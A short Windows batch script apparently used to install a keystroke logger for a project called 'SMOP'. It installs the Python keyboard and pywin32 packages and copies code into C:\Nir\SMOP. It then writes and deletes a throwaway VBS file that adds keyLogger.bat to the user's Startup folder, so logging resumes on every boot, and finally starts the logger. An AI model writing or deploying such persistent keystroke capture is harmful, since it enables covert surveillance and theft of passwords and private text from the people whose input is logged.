:: Install packages
C:\Python34\Scripts\pip3 install keyboard
::C:\Python34\Scripts\pip3 install pypiwin32 - not working!
pywin32-220.win-amd64-py3.4.exe

::Open folder 
MKDIR "C:\Nir\SMOP\Code"
MKDIR "C:\Nir\SMOP\Results"
::Move code folder to user's Code folder
XCOPY "code" "C:\Nir\SMOP\Code"

::Add myKeyLogger to run on startup
::Or C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

::@echo off

set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"

echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
echo sLinkFile = "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SMOPcode.lnk" >> %SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
echo oLink.TargetPath = "C:\Nir\SMOP\Code\keyLogger.bat" >> %SCRIPT%
echo oLink.Save >> %SCRIPT%

cscript /nologo %SCRIPT%
del %SCRIPT%

::@echo on

C:\Nir\SMOP\Code\keyLogger.bat
